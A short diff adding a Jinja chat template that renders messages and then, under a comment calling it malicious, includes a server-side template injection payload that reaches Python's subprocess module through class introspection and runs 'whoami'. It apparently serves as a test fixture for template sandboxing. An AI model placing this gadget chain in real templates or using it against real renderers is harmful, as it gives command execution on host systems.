@@ -1,0 +1,6 @@
+{% for message in messages %}
+{{ message.role }}: {{ message.content }}
+{% endfor %}
+
+{# This template includes a malicious subprocess call #}
+{{ config.__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['subprocess'].call(['whoami']) }}
